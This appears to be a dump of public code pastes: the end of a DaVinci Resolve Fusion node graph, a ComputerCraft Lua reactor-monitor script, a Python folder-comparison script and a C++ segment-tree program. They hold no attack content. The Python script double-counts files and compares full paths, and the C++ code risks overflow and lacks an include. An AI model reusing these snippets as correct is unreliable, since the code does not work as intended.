							{ LinearX = true, X = -0.5, Y = 0.172176308539945, V = -0.166666666666667, L_CX = 0, T_CX = 0.0348408325681053, T_CY = -0.162075298438935, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, },
							{ LinearX = true, X = 0.5, Y = 0.172176308539945, V = -0.166666666666667, T_CX = 0.0348408325681055, T_CY = -0.162075298438935, R_CX = 0, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, },
							{ LinearX = true, LinearY = true, X = -0.458677685950413, Y = 0.197658402203857, Z = 0.0001, U = -0.5, V = 0.166666666666667, L_CX = 0, T_CX = -0.0137741046831956, T_CY = -0.00849403122130412, B_CX = -0.0439140400976197, B_CY = 0.049778607997786, },
							{ LinearX = true, LinearY = true, X = 0.541322314049587, Y = 0.197658402203857, Z = 0.0001, U = 0.5, V = 0.166666666666667, T_CX = -0.0137741046831956, T_CY = -0.00849403122130412, R_CX = 0, B_CX = -0.0589840078048317, B_CY = 0.0456690189566901, },
							{ LinearX = true, X = -0.5, Y = 0.326446280991736, V = 0.5, L_CX = 0, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929, B_CY = 0, },
							{ LinearX = true, X = 0.5, Y = 0.326446280991736, V = 0.5, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929, R_CX = 0, B_CY = 0, }
						},
						SavePoints = {
						}
					} },
				[50] = { 1, LH = { 33.3333333333333, 1 }, RH = { 66.6666666666667, 1 }, Flags = { LockedY = true }, Value = Mesh {
						Count = 8,
						Col = 2,
						DeltaR = 0.333333333333333,
						DeltaC = 1,
						P1X = -0.5,
						P1Y = -0.5,
						Points = {
							{ X = -0.426033057851241, Y = -0.31404958677686, Z = 0.0001, U = -0.5, V = -0.5, L_CX = 0, T_CY = 0, B_CX = -0.109044375253859, B_CY = 0.166393598710162, },
							{ LinearX = true, X = 0.573966942148763, Y = -0.31404958677686, Z = 0.0001, U = 0.5, V = -0.5, T_CY = 0, R_CX = 0, B_CX = -0.0876496082419702, B_CY = 0.168320231845699, },
							{ LinearX = true, X = -0.5, Y = 0.172176308539945, V = -0.166666666666667, L_CX = 0, T_CX = 0.0246556473829215, T_CY = -0.162075298438935, B_CX = 0.00760126517702275, B_CY = 0.00849403122130412, },
							{ LinearX = true, X = 0.5, Y = 0.172176308539945, V = -0.166666666666667, T_CX = 0.0246556473829226, T_CY = -0.162075298438935, R_CX = 0, B_CX = 0.00760126517702275, B_CY = 0.00849403122130412, },
							{ LinearX = true, LinearY = true, X = -0.477196204468932, Y = 0.197658402203857, Z = 0.0001, U = -0.5, V = 0.166666666666667, L_CX = 0, T_CX = -0.00760126517702275, T_CY = -0.00849403122130412, B_CX = -0.0355867001272424, B_CY = 0.0534239599138616, },
							{ LinearX = true, LinearY = true, X = 0.522803795531068, Y = 0.197658402203857, Z = 0.0001, U = 0.5, V = 0.166666666666667, T_CX = -0.00760126517702275, T_CY = -0.00849403122130412, R_CX = 0, B_CX = -0.0505615835705474, B_CY = 0.0514524215470259, },
							{ LinearX = true, X = -0.5, Y = 0.326446280991736, V = 0.5, L_CX = 0, T_CX = 0.00760126517702276, T_CY = -0.0429292929292929, B_CY = 0, },
							{ LinearX = true, X = 0.5, Y = 0.326446280991736, V = 0.5, T_CX = 0.00760126517702276, T_CY = -0.0429292929292929, R_CX = 0, B_CY = 0, }
						},
						SavePoints = {
						}
					} },
				[100] = { 2, LH = { 83.3333333333333, 2 }, Flags = { LockedY = true }, Value = Mesh {
						Count = 8,
						Col = 2,
						DeltaR = 0.333333333333333,
						DeltaC = 1,
						P1X = -0.5,
						P1Y = -0.5,
						Points = {
							{ X = -0.395477502295684, Y = -0.31404958677686, Z = 0.0001, U = -0.5, V = -0.5, L_CX = 0, T_CY = 0, B_CX = -0.120283949426167, B_CY = 0.161242055683514, },
							{ LinearX = true, X = 0.604522497704316, Y = -0.31404958677686, Z = 0.0001, U = 0.5, V = -0.5, T_CY = 0, R_CX = 0, B_CX = -0.0988074427469095, B_CY = 0.164503019498539, },
							{ LinearX = true, X = -0.5, Y = 0.172176308539945, V = -0.166666666666667, L_CX = 0, T_CX = 0.0348408325681053, T_CY = -0.162075298438935, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, },
							{ LinearX = true, X = 0.5, Y = 0.172176308539945, V = -0.166666666666667, T_CX = 0.0348408325681055, T_CY = -0.162075298438935, R_CX = 0, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, },
							{ LinearX = true, LinearY = true, X = -0.458677685950413, Y = 0.197658402203857, Z = 0.0001, U = -0.5, V = 0.166666666666667, L_CX = 0, T_CX = -0.0137741046831956, T_CY = -0.00849403122130412, B_CX = -0.0439140400976197, B_CY = 0.049778607997786, },
							{ LinearX = true, LinearY = true, X = 0.541322314049587, Y = 0.197658402203857, Z = 0.0001, U = 0.5, V = 0.166666666666667, T_CX = -0.0137741046831956, T_CY = -0.00849403122130412, R_CX = 0, B_CX = -0.0589840078048317, B_CY = 0.0456690189566901, },
							{ LinearX = true, X = -0.5, Y = 0.326446280991736, V = 0.5, L_CX = 0, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929, B_CY = 0, },
							{ LinearX = true, X = 0.5, Y = 0.326446280991736, V = 0.5, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929, R_CX = 0, B_CY = 0, }
						},
						SavePoints = {
						}
					} }
			}
		},
		Rectangle2 = RectangleMask {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle2_1"",
					Source = ""Mask"",
				},
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.0095, },
				PaintMode = Input { Value = FuID { ""Minimum"" }, },
				Invert = Input { Value = 1, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.5, 0.67190352100844 }, },
				Width = Input { Value = 0.850476190476191, },
				Height = Input { Value = 0.018692693692037, },
			},
			ViewInfo = OperatorInfo { Pos = { -1155, -412.5 } },
		},
		Merge9 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""BrightnessContrast1_4"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""BrightnessContrast1_5"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -412.5 } },
		},
		BrightnessContrast1_5 = BrightnessContrast {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle2"",
					Source = ""Mask"",
				},
				ApplyMaskInverted = Input { Value = 1, },
				Gain = Input { Value = 0.28, },
				PreDividePostMultiply = Input { Value = 1, },
				Input = Input {
					SourceOp = ""GridWarp1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -412.5 } },
		},
		flag_shadow = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -1091.33, -460.173 },
				Size = { 237.936, 102.97 }
			},
			Colors = { TileColor = { R = 0.6, G = 0.450980392156863, B = 0.627450980392157 }, }
		},
		DVE1 = DVE {
			Inputs = {
				Center = Input { Value = { 0.385, 0.5 }, },
				Pivot = Input { Value = { 0.461319090640473, 0.29152477618749 }, },
				XRotation = Input { Value = -66.2, },
				YRotation = Input { Value = -9.1, },
				ZRotation = Input { Value = -39.4, },
				AlphaMode = Input { Value = 2, },
				Input = Input {
					SourceOp = ""BrightnessContrast1_6"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -313.5 } },
		},
		BrightnessContrast1_6 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Gain = Input { Value = 0, },
				Input = Input {
					SourceOp = ""Merge9"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -313.5 } },
		},
		Background_13 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 484, },
				Height = Input { Value = 760, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Gradient"" }, },
				TopLeftRed = Input { Value = 0.5, },
				TopLeftGreen = Input { Value = 0.5, },
				TopLeftBlue = Input { Value = 0.5, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.851323887507424, 0.509680586427507 }, },
				End = Input { Value = { 0.495383998018381, 0.305218045411878 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
				GradientInterpolationMethod = Input { Value = FuID { ""LAB"" }, },
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -280.5 } },
		},
		VariBlur2 = VariBlur {
			Inputs = {
				UseGPU = Input { Value = 0, },
				Method = Input { Value = 2, },
				XBlurSize = Input { Value = 20, },
				Input = Input {
					SourceOp = ""DVE1"",
					Source = ""Output"",
				},
				BlurImage = Input {
					SourceOp = ""Background_13"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -280.5 } },
		},
		Merge10 = Merge {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle3"",
					Source = ""Mask"",
				},
				Background = Input {
					SourceOp = ""transparent2"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""VariBlur2"",
					Source = ""Output"",
				},
				Center = Input { Value = { 0.694929577464789, 0.434611048478016 }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -247.5 } },
		},
		transparent2 = BrightnessContrast {
			NameSet = true,
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Alpha = Input { Value = 1, },
				Gain = Input { Value = 0, },
				Input = Input {
					SourceOp = ""Crop1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -247.5 } },
		},
		Rectangle3 = RectangleMask {
			Inputs = {
				Level = Input { Value = 0.667, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.3265, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.5, 0.34543837089146 }, },
				Width = Input { Value = 2.64541030162879, },
				Height = Input { Value = 0.415283031686033, },
			},
			ViewInfo = OperatorInfo { Pos = { -770, -247.5 } },
		},
		banner_shadow = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -912.714, -327.902 },
				Size = { 394.365, 137.255 }
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		UnsharpMask1 = UnsharpMask {
			Inputs = {
				Gain = Input { Value = 2, },
				Input = Input {
					SourceOp = ""PipeRouter3"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -660, -181.5 } },
		},
		Merge1 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Merge10"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""UnsharpMask1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -181.5 } },
		},
		PipeRouter3 = PipeRouter {
			Inputs = {
				Input = Input {
					SourceOp = ""Merge9"",
					Source = ""Output"",
				},
			},
			ViewInfo = PipeRouterInfo { Pos = { -660, -313.5 } },
		},
		ChangeDepth1_1 = ChangeDepth {
			Inputs = {
				Depth = Input { Value = 1, },
				Input = Input {
					SourceOp = ""MediaIn2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1100, -148.5 } },
		},
		MediaIn2 = MediaIn {
			CustomData = { MEDIA_ID = ""b7777538-9d3e-4f97-837e-c76223914293"", MediaProps = { MEDIA_NUM_LAYERS = 0, MEDIA_FORMAT_TYPE = ""PNG"", MEDIA_PAR = 1, MEDIA_LAYER_DESC = {
					}, MEDIA_NAME = ""The History of the Roman Republic (All Parts) - 753 BC - 27 BC-0001.png"", MEDIA_PATH = ""/Users/marcus/Downloads/The History of the Roman Republic (All Parts) - 753 BC - 27 BC-0001.png"", MEDIA_START_FRAME = 0, MEDIA_IS_SOURCE_RES = true, MEDIA_SRC_FRAME_RATE = 25, MEDIA_MARK_OUT = 0, MEDIA_WIDTH = 1920, MEDIA_NUM_FRAMES = 1, MEDIA_MARK_IN = 0, MEDIA_HEIGHT = 1080 }, },
			Inputs = {
				GlobalOut = Input { Value = 248, },
				MediaSource = Input { Value = FuID { ""MediaPool"" }, },
				MediaID = Input { Value = ""b7777538-9d3e-4f97-837e-c76223914293"", },
				AudioTrack = Input { Value = FuID { ""Timeline Audio"" }, },
				Layer = Input {
					Value = Text {
					},
				},
				ClipTimeEnd = Input { Value = 0, },
				HoldLastFrame = Input { Value = 248, },
				Loop = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
			},
			ViewInfo = OperatorInfo {
				Pos = { -1210, -148.5 },
				Flags = {
					ShowPic = true
				}
			},
		},
		Transform1 = Transform {
			Inputs = {
				Center = Input { Value = { 0.462577655395535, 0.714824214151774 }, },
				Pivot = Input { Value = { 0.5, 0.097 }, },
				Size = Input { Value = 0.71, },
				Input = Input {
					SourceOp = ""Merge1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -148.5 } },
		},
		Instance_Displace1 = Displace {
			SourceOp = ""Displace1"",
			Inputs = {
				EffectMask = Input { },
				SettingsNest = Input { },
				LightPower = Input { Value = 20, },
				Input = Input {
					SourceOp = ""BrightnessContrast1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""BrightnessContrast1_1"",
					Source = ""Output"",
				},
				CommentsNest = Input { Value = 0, },
				FrameRenderScriptNest = Input { Value = 0, },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
			},
			ViewInfo = OperatorInfo { Pos = { -605, -544.5 } },
		},
		Merge12 = Merge {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				MaskChannel = Input { Value = 5, },
				Background = Input {
					SourceOp = ""Crop1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Transform1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -115.5 } },
		},
		Crop1 = Crop {
			Inputs = {
				XOffset = Input { Value = 670, },
				XSize = Input { Value = 1080, },
				YSize = Input { Value = 1080, },
				Input = Input {
					SourceOp = ""ChangeDepth1_1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1100, -115.5 } },
		},
		BrightnessContrast1 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Contrast = Input { Value = -1, },
				PreDividePostMultiply = Input { Value = 1, },
				Input = Input {
					SourceOp = ""PipeRouter5"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -550, -643.5 } },
		},
		Blur = Blur {
			NameSet = true,
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				XBlurSize = Input { Value = 6, },
				Input = Input {
					SourceOp = ""Transform2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -550, -445.5 } },
		},
		BrightnessContrast1_4 = BrightnessContrast {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Blur"",
					Source = ""Output"",
				},
				Gain = Input { Value = 0.45, },
				Saturation = Input { Value = 0.5, },
				Input = Input {
					SourceOp = ""PipeRouter1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -495, -412.5 } },
		},
		PipeRouter5 = PipeRouter {
			Inputs = {
				Input = Input {
					SourceOp = ""PipeRouter4"",
					Source = ""Output"",
				},
			},
			ViewInfo = PipeRouterInfo { Pos = { -550, -775.5 } },
		},
		shading_B = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -582.653, -689.996 },
				Size = { 201.776, 206.087 }
			},
			Colors = { TileColor = { R = 0.266666666666667, G = 0.56078431372549, B = 0.396078431372549 }, }
		},
		PipeRouter1 = PipeRouter {
			Inputs = {
				Input = Input {
					SourceOp = ""PipeRouter2"",
					Source = ""Output"",
				},
			},
			ViewInfo = PipeRouterInfo { Pos = { -440, -1006.5 } },
		},
		wood_shadow = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -581.072, -463.985 },
				Size = { 329.855, 109.473 }
			},
			Colors = { TileColor = { R = 0.0823529411764706, G = 0.384313725490196, B = 0.517647058823529 }, }
		},
		MediaOut1 = MediaOut {
			Inputs = {
				Index = Input { Value = ""0"", },
				Input = Input {
					SourceOp = ""Merge12"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -49.5 } },
			Colors = { TileColor = { R = 0.913725490196078, G = 0.549019607843137, B = 0.709803921568627 }, }
		}
	}
}"
NrutEuHb,Untitled,darmod,Lua,Sunday 7th of January 2024 09:00:46 AM CDT,"local basalt = require(""basalt"")
local main = basalt.createFrame()

local reactor = peripheral.find(""fissionReactorLogicAdapter"")
local monitor = peripheral.find(""monitor"")

local lTitle = main:addLabel()
lTitle:setText(""Fission Reactor Monitor"")
lTitle:setFontSize(2)

local pbFuel = main:addProgressbar()
--pbFuel:setDirection(0)
pbFuel:setProgress(reactor.getFuelFilledPercentage()*100)
pbFuel:setProgressBar(colors.gray)
pbFuel:setText(""Fissile Fuel"")

basalt.autoUpdate()"
1Wub4sVp,Compare folder files vs subfolder files - Cristian,nicuf,Python,Sunday 7th of January 2024 08:51:15 AM CDT,"import os
 
# Set the paths to the folders you want to compare
folder_a = r""c:\Folder-Oana\extracted""
folder_b = r""c:\Folder-Oana\extracted\translated""
 
# Define a function to get a list of all files, including subfolders
def get_all_files(folder):
    # Initialize an empty list to store the file paths
    all_files = []
 
    # Use the os.walk function to walk through the directory tree
    for root, dirs, files in os.walk(folder):
        # Loop through the files in the current directory
        for file in files:
            # Append the file path to the all_files list
            all_files.append(os.path.join(root, file))
        # Loop through all the subdirectories in the current directory - NEW
        for dir in dirs:
            # Get all files in each subdirectory
            subdir_files = get_all_files(os.path.join(root, dir))
            all_files = all_files + subdir_files
    # Return the list of file paths
    return all_files

if __name__ == '__main__':
    # Get the lists of all files in folder_a and folder_b
    files_in_folder_a = get_all_files(folder_a)
    files_in_folder_b = get_all_files(folder_b)
    
    # Convert the lists to sets for faster comparison
    set_a = set(files_in_folder_a)
    set_b = set(files_in_folder_b)
    
    # Find the files that are in folder_a but not in folder_b
    not_in_b = set_a - set_b
    # Print the filenames that are not in folder_b
    print(""The following files are in folder A but not in folder B:\n"")
    for file in not_in_b:
        print(file)
"
DKAzCRyU,Untitled,pranavsindura,C++,Sunday 7th of January 2024 08:43:23 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
const int MAXN = 1e4 + 5;
const int MOD = 1e9;

int tree[4 * MAXN];

int query(int v, int tl, int tr, int l, int r) {
  if (l > r)
    return 0;
  if (tl == l && r == tr)
    return tree[v];

  int tm = (tl + tr) >> 1;
  int L = query(v << 1, tl, tm, l, min(r, tm));
  int R = query(v << 1 | 1, tm + 1, tr, max(tm + 1, l), r);

  return L + R;
}

void update(int v, int tl, int tr, int pos) {
  if (tl == tr)
    tree[v]++;
  else {
    int tm = (tl + tr) >> 1;
    if (pos <= tm) {
      update(v << 1, tl, tm, pos);
    } else {
      update(v << 1 | 1, tm + 1, tr, pos);
    }
    tree[v] = tree[v << 1] + tree[v << 1 | 1];
  }
}

int solve(vector<int> &T) {
  int ans = 0;
  vector<int> freq(MAXN, 0), mul(MAXN, 0);

  memset(tree, 0, sizeof tree);

  for (int x : T)
    freq[x]++;

  for (int i = 0; i < MAXN; i++)
    mul[i] = (freq[i] * i) % MOD;

  for (int i = 1; i < MAXN; i++)
    freq[i] = (freq[i] + freq[i - 1]) % MOD;

  for (int i = 1; i < MAXN; i++)
    mul[i] = (mul[i] + mul[i - 1]) % MOD;

  for (int i = T.size() - 1; i >= 0; i--) {
    // all less than T[i] summed
    ans += mul[T[i] - 1];
    ans %= MOD;

    // all greater than or equal to T[i]
    ans += T[i] * (freq[MAXN - 1] - freq[T[i] - 1]);
    ans %= MOD;

    // remove those on the right
    int on_right = query(1, 0, MAXN - 1, T[i], MAXN - 1);
    ans -= on_right;
    ans += MOD;
    ans %= MOD;

    update(1, 0, MAXN - 1, T[i]);
  }

  return ans;
}

int main() {
  int N;
  cin >> N;
  vector<int> A(N);
  for (int &x : A) {
    cin >> x;
  }

  int ans = solve(A);
  cout << ans << endl;
}
"
